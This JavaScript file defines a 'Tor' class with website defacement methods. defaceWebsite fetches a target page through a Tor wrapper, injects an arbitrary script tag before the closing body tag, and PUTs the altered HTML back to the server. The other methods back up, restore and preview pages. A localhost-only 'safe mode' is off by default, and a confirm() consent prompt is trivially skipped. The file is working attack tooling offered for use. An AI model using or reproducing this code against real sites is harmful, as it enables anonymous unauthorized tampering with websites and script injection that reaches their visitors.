class Tor {
    constructor() {
        // Existing code...

        this.isSafeMode = false;
    }

    // Add a safe mode check
    isTargetSafe(url) {
        if (this.isSafeMode) {
            const safeTargets = ['localhost', '127.0.0.1'];
            const targetHostname = new URL(url).hostname;
            return safeTargets.includes(targetHostname);
        }
        return true;
    }

    // New defacement tool methods
    async backupWebsite(url) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }

        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                throw new Error(`Backup failed with status: ${response.status}`);
            }
            const content = await response.text();
            const backupKey = `backup_${Date.now()}`;
            localStorage.setItem(backupKey, content);
            return { success: true, backupKey: backupKey, message: 'Website backed up successfully.' };
        } catch (error) {
            this.log(`Backup error: ${error}`, 'error');
            return { success: false, message: `Backup failed: ${error}` };
        }
    }

    async restoreWebsite(url, backupKey) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }

        try {
            const backupContent = localStorage.getItem(backupKey);
            if (!backupContent) {
                throw new Error('Backup not found.');
            }

            const options = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: backupContent,
                redirect: 'follow'
            };

            const response = await this.fetchWithTor(url, options);
            if (!response.ok) {
                throw new Error(`Restore failed with status: ${response.status}`);
            }

            return { success: true, message: 'Website restored successfully.' };
        } catch (error) {
            this.log(`Restore error: ${error}`, 'error');
            return { success: false, message: `Restore failed: ${error}` };
        }
    }

    async previewDefacement(url, defaceScript) {
      if (!this.isTargetSafe(url)) {
          this.log('Target is not safe. Operation aborted.', 'warn');
          return { success: false, message: 'Target is not safe.' };
      }
      try {
          const response = await this.fetchWithTor(url, { method: 'GET' });
          if (!response.ok) {
              throw new Error(`Preview failed with status: ${response.status}`);
          }

          let targetContent = await response.text();

          const scriptTag = `<script>${defaceScript}</script>`;
          const injectionPoint = targetContent.indexOf('</body>');

          if (injectionPoint !== -1) {
              targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
          } else {
              targetContent += scriptTag;
          }

          return { success: true, previewContent: targetContent };
      } catch (error) {
          this.log(`Preview error: ${error}`, 'error');
          return { success: false, message: `Preview failed: ${error}` };
      }
    }

    async defaceWebsite(url, defaceScript) {
        if (!this.isTargetSafe(url)) {
            this.log('Target is not safe. Operation aborted.', 'warn');
            return { success: false, message: 'Target is not safe.' };
        }
        
        // Add consent verification
        if (!confirm('You are about to deface a website. Do you have explicit permission?')) {
            this.log('Deface operation cancelled due to lack of consent.', 'warn');
            return { success: false, message: 'Operation cancelled: Permission not granted.' };
        }

        try {
            const response = await this.fetchWithTor(url, { method: 'GET' });
            if (!response.ok) {
                throw new Error(`Failed to fetch the website. Status: ${response.status}`);
            }

            let targetContent = await response.text();

            const scriptTag = `<script>${defaceScript}</script>`;
            const injectionPoint = targetContent.indexOf('</body>');

            if (injectionPoint !== -1) {
                targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
            } else {
                targetContent += scriptTag;
            }

            const putOptions = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: targetContent,
                redirect: 'follow'
            };

            const putResponse = await this.fetchWithTor(url, putOptions);

            if (putResponse.ok) {
                const successMessage = 'Website defaced successfully!';
                this.log(successMessage, 'success');
                return { success: true, message: successMessage };
            } else {
                const errorMessage = `Failed to deface website. Status: ${putResponse.status}`;
                this.log(errorMessage, 'error');
                return { success: false, message: errorMessage };
            }
        } catch (error) {
            const errorMessage = `Deface operation failed: ${error}`;
            this.log(errorMessage, 'error');
            return { success: false, message: errorMessage };
        }
    }

    setSafeMode(safeMode) {
        this.isSafeMode = safeMode;
        this.log(`Safe mode set to: ${safeMode}`, 'info');
    }
}

window.Tor = Tor;